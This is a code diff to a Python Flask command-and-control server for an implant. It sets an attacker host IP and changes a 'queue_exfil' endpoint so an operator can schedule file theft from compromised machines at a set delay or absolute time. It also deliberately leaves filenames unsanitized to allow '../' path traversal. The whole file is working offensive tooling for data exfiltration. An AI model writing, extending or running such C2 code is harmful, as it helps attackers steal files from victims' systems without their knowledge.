@@ -16,7 +16,7 @@ from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from cryptography.hazmat.primitives import serialization
 
 app = Flask(__name__)
-HOST = "" or input("enter your attacker/host/local ip:")
+HOST = "127.0.0.1" or input("enter your attacker/host/local ip:")
 PORT = 8443
 CERT_FOLDER = "cert"
 UPLOAD_FOLDER = "uploads"
@@ -103,7 +103,7 @@ def restore_key() -> bytes:
     initiate key exchange. If this happens, we attempt to recover it from the backup saved in
     "CERT_FOLDER/derived.key"
     """
-    # create "derived.key" if it doesn't exist
+    # create dummy "derived.key" if it doesn't exist
     if not os.path.exists(os.path.join(CERT_FOLDER, "derived.key")):
         print(f"[!] '{CERT_FOLDER}/derived.key' not found, creating empty file")
         with open(os.path.join(CERT_FOLDER, "derived.key"), "wb") as f:
@@ -270,8 +270,10 @@ def queue_exfil():
     Implant will respond to FILE_ENDPOINT
     """
     data = request.json
-    files = data.get("files")
-    delay = data.get("delay")
+    files: str = data.get("files")
+    abs_time_local: str = data.get("time")
+    duration: str = data.get("delay")
+    timestamp = None
 
     # allow inputting single files
     if isinstance(files, str):
@@ -282,17 +284,29 @@ def queue_exfil():
     ):
         return "[!] Request must include 'files' param as list[str]\n", 400
 
-    if not delay:
-        delay = "00:00:00:00"
-    delay_seconds = parse_duration(delay)
+    if abs_time_local:
+        timestamp = (
+            datetime.strptime(abs_time_local, "%Y-%m-%d %H:%M:%S")
+            .astimezone(timezone.utc)
+            .timestamp()
+        )
+    if not duration:
+        duration = "00:00:00:00"
+
+    delay_seconds = parse_duration(duration)
     if delay_seconds is None:
-        return "[!] delay must be in dd:hh:mm:ss format, file exfil aborted\n", 400
+        return "[!] delay must be in dd:hh:mm:ss format, task aborted\n", 400
 
     for filename in files:
-        # don't secure filename because we want file traversal
-        add_task(f"FILE {filename}", delay_seconds)
+        # don't secure filename because we want file traversal with '../'
+        if timestamp:
+            add_task(f"FILE {filename}", abs_time=timestamp)
+            time_status = f"exfil at {timestamp}"
+        else:
+            add_task(f"FILE {filename}", delay_seconds)
+            time_status = f"exfil after {delay_seconds} second delay"
 
-    return f"[*] {len(files)} files added"
+    return f"[*] {len(files)} files added, {time_status}"
 
 
 @app.route(FILE_ENDPOINT, methods=["POST"])
